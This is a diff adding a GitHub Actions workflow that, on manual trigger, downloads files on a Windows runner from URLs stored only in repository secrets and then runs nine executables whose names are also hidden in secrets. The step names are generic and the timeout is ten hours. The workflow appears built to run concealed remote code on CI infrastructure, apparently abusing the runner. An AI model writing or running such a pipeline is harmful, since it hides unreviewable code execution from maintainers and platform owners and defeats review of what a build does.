@@ -1,0 +1,28 @@
+name: genarator3
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    timeout-minutes: 600
+
+    steps:
+    - name: command 1
+      run: |
+        Invoke-WebRequest ${{ secrets.EA_A }}
+        Invoke-WebRequest ${{ secrets.EA_B }}
+        .\${{ secrets.EA_C }}
+    - name: command 2
+      run: .\${{ secrets.EA_D }}
+    - name: command 3
+      run: .\${{ secrets.EA_E }}
+    - name: command 4
+      run: .\${{ secrets.EA_F }}
+    - name: command 5
+      run: .\${{ secrets.EA_G }}
+    - name: command 6
+      run: .\${{ secrets.EA_H }}
+    - name: command 7
+      run: .\${{ secrets.EA_I }}
